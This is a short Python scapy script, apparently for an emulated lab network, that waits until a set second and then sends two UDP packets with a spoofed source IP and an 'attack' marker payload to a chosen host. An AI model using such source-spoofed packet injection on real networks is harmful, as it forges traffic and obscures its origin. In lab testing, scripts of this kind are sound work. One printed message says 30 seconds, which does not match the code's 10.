#!/usr/bin/python3
import sys
import time
from datetime import datetime, timedelta
from scapy.all import Ether, IP, UDP, sendp, Raw

ATTACK_IP = "10.0.0.8"

MAC_MAP = {
    "10.0.0.1": "00:00:00:00:00:01",
    "10.0.0.2": "00:00:00:00:00:02",
    "10.0.0.3": "00:00:00:00:00:03"
}

def wait_until_target_time():
    """
    Calculate the target time (the 10s of the next minute) and block to wait
    """
    now = datetime.now()
    
    target_time = (now + timedelta(minutes=1)).replace(second=10, microsecond=0)
    
    wait_seconds = (target_time - now).total_seconds()
    
    print(f"[*] current time: {now.strftime('%H:%M:%S')}")
    print(f"[*] Lock the launch time: {target_time.strftime('%H:%M:%S')} (The next minute's 30 seconds)")
    print(f"[*] Countdown waiting: {wait_seconds:.2f} 秒...")
    print("-" * 40)
    
    if wait_seconds > 0:
        time.sleep(wait_seconds)
    
    print(f"\n[!] Time's up ({datetime.now().strftime('%H:%M:%S.%f')})")

def send_one_packet(iface, dst_ip):
    # Find the MAC address corresponding to the destination IP
    dst_mac = MAC_MAP.get(dst_ip, "ff:ff:ff:ff:ff:ff")

    print(f"[*] {iface} send: {ATTACK_IP} -> {dst_ip}")
    print(f"    (L2: DstMAC={dst_mac}, SrcIP={ATTACK_IP})")
    
    # Construct packets
    pkt = Ether(dst=dst_mac) / \
          IP(src=ATTACK_IP, dst=dst_ip) / \
          UDP(sport=6666, dport=5555) / \
          Raw(b"LOOPGEN_ATTACK_PACKET")
    
    # 3. Send packet
    sendp(pkt, iface=iface, verbose=False, count=2, inter=0.1)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 attack_l3_timed.py <interface> <dst_ip>")
        print("Example: python3 attack_l3_timed.py h1-eth0 10.0.0.2")
        sys.exit(1)

    iface = sys.argv[1]
    dst_ip = sys.argv[2]

    wait_until_target_time()
    
    send_one_packet(iface, dst_ip)
